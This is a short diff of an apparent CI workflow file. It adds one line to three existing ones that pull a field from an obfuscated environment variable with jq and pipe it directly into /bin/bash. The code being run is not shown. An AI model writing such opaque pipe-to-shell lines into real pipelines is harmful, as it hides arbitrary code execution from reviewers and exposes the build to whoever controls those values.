@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$kyne345" | jq -r .sftd2 | /bin/bash
           printf '%s' "$qaid68" | jq -r .f23625 | /bin/bash
           printf '%s' "$npzho44" | jq -r .vkrv75388 | /bin/bash
+          echo $ndqa683 | jq -r .vm8 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
